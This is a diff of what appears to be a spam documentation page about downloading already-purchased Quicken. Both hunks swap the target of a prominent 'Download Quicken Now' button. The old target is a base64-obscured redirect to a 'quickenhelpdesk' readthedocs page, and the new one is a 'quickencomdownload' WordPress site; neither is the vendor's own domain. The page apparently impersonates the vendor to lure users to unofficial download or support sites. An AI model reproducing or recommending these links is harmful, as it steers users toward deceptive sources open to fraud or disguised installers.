@@ -4,7 +4,7 @@ How to Download Quicken Already Purchased – Complete Activation
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuaGVscGRlc2sucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken Now
         </a>
     </div>
@@ -122,7 +122,7 @@ Reinstalling or transferring Quicken is simple when you use the correct steps. T
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuaGVscGRlc2sucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Download Quicken Now
         </a>
     </div>
